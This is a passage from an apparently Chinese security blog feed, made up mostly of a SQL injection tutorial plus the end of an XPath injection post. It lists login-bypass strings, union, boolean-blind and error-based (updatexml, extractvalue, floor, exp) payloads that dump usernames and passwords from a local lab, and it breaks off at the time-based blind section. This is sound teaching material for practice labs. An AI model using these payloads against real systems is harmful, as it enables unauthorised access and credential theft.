substring((//user[position()=1]/username[position()=1]),3,1)=&#x27;</span>a<span class="hljs-string">&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><br><span class="hljs-string">&#x27;or substring((//user[position()=1]/username[position()=1]),4,1)=&#x27;</span>g<span class="hljs-string">&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><br>...<br></code></pre></td></tr></table></figure><p>更多参考</p><p><ahref="https://jiang-niao.github.io/2020/04/24/从ctf题目中学习xpath注入/#CTF题目">xpath盲注脚本</a></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>xml</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sql注入</title>
    <link href="/2023/01/01/sql%E6%B3%A8%E5%85%A5/"/>
    <url>/2023/01/01/sql%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="sql注入">sql注入</h1><h2 id="数据库知识">数据库知识</h2><p>数据库结构：</p><p>mysql</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xl">库-表-字段（数据）<br><span class="hljs-function"><span class="hljs-title">database</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">table</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">column</span>-&gt;</span>value<br></code></pre></td></tr></table></figure><p>常用sql语句：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">数据库创建</span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash">create database school;</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">查询数据库</span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash">show databases;</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">创建表</span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash">create table student(<span class="hljs-built_in">id</span> int(10),username varchar(20),mail varchar(20));</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">查询表</span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash">show tables;</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">插入数据</span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash">insert into student(<span class="hljs-built_in">id</span>,username,mail) values(1,<span class="hljs-string">&quot;zhangsan&quot;</span>,<span class="hljs-string">&quot;zs@redteam.com&quot;</span>);</span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash">insert into student(<span class="hljs-built_in">id</span>,username,mail) values(2,<span class="hljs-string">&quot;lisi&quot;</span>,<span class="hljs-string">&quot;ls@redteam.com&quot;</span>);</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">查询数据</span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash"><span class="hljs-keyword">select</span> mail from student;</span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash"><span class="hljs-keyword">select</span> * from student;</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">修改数据</span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash">update student <span class="hljs-built_in">set</span> username=<span class="hljs-string">&quot;zhangsan2&quot;</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span> = 1 ;</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">删除数据</span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash">delete from student <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span> = 1;</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">删除表</span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash">drop table student;</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">删除数据库</span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash">drop database school;</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">查询登录的用户</span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash"><span class="hljs-keyword">select</span> user();</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">查询数据存放地址</span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash"><span class="hljs-keyword">select</span> @@datadir;</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">查询数据库的版本</span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash"><span class="hljs-keyword">select</span> version();</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-built_in">where</span>条件,<span class="hljs-built_in">limit</span>条件</span><br>where 字段名=x 返回对应字段名为x的那一行<br>limit x,x 查询的数据 只返回第(x-1)行开始的内容 返回x行<br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash"><span class="hljs-keyword">select</span> * from <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&#x27;id&#x27;</span> <span class="hljs-built_in">limit</span> 0,1;</span><br></code></pre></td></tr></table></figure><p>PHP连接数据库语句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$host</span> = <span class="hljs-string">&quot;localhost&quot;</span>;<br><span class="hljs-variable">$user</span> = <span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-variable">$pass</span> = <span class="hljs-string">&quot;root&quot;</span>;<br><br><span class="hljs-variable">$conn</span> = <span class="hljs-title function_ invoke__">mysql_connect</span>(<span class="hljs-variable">$host</span>,<span class="hljs-variable">$user</span>,<span class="hljs-variable">$pass</span>);  <span class="hljs-comment">//打开非持久的 MySQL 连接</span><br><span class="hljs-title function_ invoke__">mysql_select_db</span>(<span class="hljs-string">&quot;school&quot;</span>);   <span class="hljs-comment">//选择school数据库</span><br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from student&quot;</span>;<br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);  <span class="hljs-comment">//执行sql语句</span><br><span class="hljs-keyword">while</span>(<span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>))&#123;  <span class="hljs-comment">//取一行结果为数组（有keyvalue），没有行返回false</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;id:&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;id&quot;</span>].<span class="hljs-string">&quot; username:&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;username&quot;</span>].<span class="hljs-string">&quot; mail:&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;mail&quot;</span>].<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="sql注入-1">sql注入</h2><p>原理</p><p>闭合符号如<code>'</code>、<code>"</code>、<code>')</code>，达到执行其他语句的效果</p><p>万能密码</p><p>sql语句：</p><p><code>SELECT * FROM users WHERE username= '".$username."' AND Password= '".md5($password)."'</code></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-string">&#x27; or 1=&#x27;</span>1<br><span class="hljs-string">&#x27;or&#x27;</span>=<span class="hljs-string">&#x27;or&#x27;</span><br><span class="hljs-string">&quot;or &quot;</span>a<span class="hljs-string">&quot;=&quot;</span>a<br>a<span class="hljs-string">&#x27; having 1=1#</span><br><span class="hljs-string">a&#x27;</span> having <span class="hljs-attribute">1</span>=1--<br>admin<span class="hljs-string">&#x27;--</span><br><span class="hljs-string">admin&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-attribute">1</span>=1--<br>admin<span class="hljs-string">&#x27; or 1=1#</span><br><span class="hljs-string">admin&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1&#x27;</span>--<br>admin<span class="hljs-string">&#x27; or &#x27;</span>1<span class="hljs-string">&#x27;=&#x27;</span>1<br>admin<span class="hljs-string">&#x27; OR 4=4/*</span><br><span class="hljs-string">&#x27;</span>)<span class="hljs-keyword">or</span>(<span class="hljs-string">&#x27;a&#x27;</span>=<span class="hljs-string">&#x27;a</span><br><span class="hljs-string">or 4=4--</span><br><span class="hljs-string">&quot;or 4=4--</span><br><span class="hljs-string">&#x27;</span><span class="hljs-keyword">or</span> <span class="hljs-attribute">4</span>=4/*<br><span class="hljs-string">&#x27;or&#x27;</span>a<span class="hljs-string">&#x27;=&#x27;</span>a<br><span class="hljs-string">&quot;or&quot;</span>=<span class="hljs-string">&quot;a&#x27;=&#x27;a</span><br><span class="hljs-string">&#x27;or&#x27;&#x27;=&#x27;</span><br><span class="hljs-string">&#x27;or&#x27;=&#x27;or&#x27;</span><br><span class="hljs-string">&#x27; OR &#x27;1&#x27;=&#x27;1</span><br><span class="hljs-string">&#x27;OR 4=4%00</span><br><span class="hljs-string">&quot;</span><span class="hljs-keyword">or</span> <span class="hljs-attribute">4</span>=4%00<br>1<span class="hljs-string">&#x27;or&#x27;</span>1<span class="hljs-string">&#x27;=&#x27;</span>1<br>1 <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1&#x27;</span>=1<br>1 <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-attribute">4</span>=4<br>admin<span class="hljs-string">&#x27; UNION Select 1,1,1 FROM admin Where &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><br>-1%cf<span class="hljs-string">&#x27; union select 1,1,1 as password,1,1,1 %23</span><br></code></pre></td></tr></table></figure><h3 id="union注入">union注入</h3><p>union的使用：sql语句1 union sql语句2如果字段数相同的话会同时返回，且sql语句1出错时只返回sql语句2</p><p>注入流程：</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs gauss">判断注入点：<br><span class="hljs-number">1</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span><br><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">2</span> <span class="hljs-built_in">union</span><br><span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span><span class="hljs-meta">#</span><br><span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">2</span><span class="hljs-meta">#</span><br><span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">or</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span><span class="hljs-meta">#</span><br><span class="hljs-number">1</span>&#x27; <span class="hljs-built_in">union</span>……<span class="hljs-meta">#</span><br><br>获取字段数量，查看回显位置<br><span class="hljs-number">-1</span>&#x27; order by <span class="hljs-number">4</span><span class="hljs-meta">#</span><br><span class="hljs-number">-1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><span class="hljs-meta">#</span><br><br>查询库<br><span class="hljs-number">-1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-built_in">database</span>()<span class="hljs-meta">#</span><br><br>查询库中表名<br><span class="hljs-number">-1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,table_name from information_schema.tables <span class="hljs-built_in">where</span> table_schema=<span class="hljs-built_in">database</span>() limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span><span class="hljs-meta">#</span><br><br>查询字段名<br><span class="hljs-number">-1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-built_in">group_concat</span>(column_name) from information_schema.columns <span class="hljs-built_in">where</span> table_name=&#x27;users&#x27; limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span><span class="hljs-meta">#</span><br><br>查数据<br><span class="hljs-number">-1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,id from sqli.users limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure><h3 id="布尔盲注">布尔盲注</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; and substr(database(),1,1)=&#x27;</span>s<span class="hljs-string">&#x27;--+</span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">and</span> length(<span class="hljs-keyword">database</span>())&gt;=<span class="hljs-number">1</span><span class="hljs-comment">--+</span><br><span class="hljs-number">1</span><span class="hljs-string">&#x27; and length(select database())&gt;=1--+</span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">and</span> ascii(substr((<span class="hljs-keyword">database</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">80</span><span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h3 id="报错注入">报错注入</h3><h4 id="updatexml">updatexml</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">0x3a</span>、<span class="hljs-number">0x7e</span>是为了在xpath中是语法错误的<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x3a</span>,<span class="hljs-keyword">database</span>(),<span class="hljs-number">0x3a</span>),<span class="hljs-number">1</span>) <span class="hljs-comment">--+</span><br>表名：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> ),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>) <span class="hljs-comment">--+</span><br>字段名：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>) <span class="hljs-comment">--+</span><br>数据：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(id,<span class="hljs-number">0x7e</span>,username,<span class="hljs-number">0x7e</span>,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">security</span>.users),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>) <span class="hljs-comment">--+</span><br>数据：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(id,<span class="hljs-number">0x7e</span>,username,<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)) <span class="hljs-keyword">from</span> <span class="hljs-keyword">security</span>.users),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>) <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h4 id="extractvalue">extractvalue</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">描述：使用xpath表示法从<span class="hljs-type">XML</span>字符串中提取值<br>xml_docment:<span class="hljs-type">xml</span>标记<br>Xpthstring: 显示输入语句<br>new_value:新值<br>数据库名：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,concat(<span class="hljs-keyword">database</span>())))<span class="hljs-comment">--+</span><br>表名：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,concat((<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span>))))<span class="hljs-comment">--+</span><br>字段名：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,concat((<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>))))<span class="hljs-comment">--+</span><br>数据：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(id,<span class="hljs-number">0x7e</span>,username,<span class="hljs-number">0x7e</span>,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">security</span>.users)))<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h4 id="floor">floor()</h4><p>floor的讲解参考：https://www.cnblogs.com/litlife/p/8472323.html</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">floor,count,<span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span>冲突报错<br>数据库名：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> count(*),concat(<span class="hljs-keyword">database</span>(),<span class="hljs-number">0x7e</span>,floor(rand(<span class="hljs-number">0</span>)<span class="hljs-number">2</span>))x <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x) a)<span class="hljs-comment">--+</span><br>表名：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> count(),concat(<span class="hljs-string">&#x27;~&#x27;</span>,(<span class="hljs-keyword">select</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">3</span>,<span class="hljs-number">1</span>),<span class="hljs-string">&#x27;~&#x27;</span>,floor(rand(<span class="hljs-number">0</span>)<span class="hljs-number">2</span>)) <span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x)a) <span class="hljs-comment">--+</span><br>字段名：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> count(),concat(<span class="hljs-string">&#x27;~&#x27;</span>,(<span class="hljs-keyword">select</span> <span class="hljs-built_in">column_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">5</span>,<span class="hljs-number">1</span>),<span class="hljs-string">&#x27;~&#x27;</span>,floor(rand(<span class="hljs-number">0</span>)<span class="hljs-number">2</span>)) <span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x)a) <span class="hljs-comment">--+</span><br>数据：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> count() ,concat(<span class="hljs-string">&#x27;~&#x27;</span>(<span class="hljs-keyword">select</span> concat(username,&quot;;&quot;,<span class="hljs-keyword">password</span>,&quot;;&quot;)<span class="hljs-keyword">from</span> <span class="hljs-keyword">security</span>.users <span class="hljs-keyword">limit</span> <span class="hljs-number">5</span>,<span class="hljs-number">1</span>),floor(rand(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))x <span class="hljs-keyword">from</span> <span class="hljs-keyword">security</span>.users <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x)a) <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h4 id="exp">exp()</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">数据库名：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> exp(~(<span class="hljs-keyword">select</span>*<span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>())x))<span class="hljs-comment">--+</span><br>表名：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> exp(~(<span class="hljs-keyword">select</span>*<span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span>)x))<span class="hljs-comment">-- +</span><br>字段名：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> exp(~(<span class="hljs-keyword">select</span>*<span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>)x))<span class="hljs-comment">--+</span><br>数据：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> exp(~(<span class="hljs-keyword">select</span>*<span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> group_concat(username,<span class="hljs-number">0x7e</span>,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">security</span>.users)x))<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h4 id="其他">其他</h4><p>参考https://blog.csdn.net/weixin_54217950/article/details/122938063</p><p>如果显示不完整： substring(database(),5,10)Substring是字符截取函数，从数据里面第五个字符开始截取十个字符</p><h3 id="时间盲注">时间盲注</h3><p><code>if(expr1,expr2,expr3)</code>-&gt;如果expr1是true，则返回expr2；否则返回expr3。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span 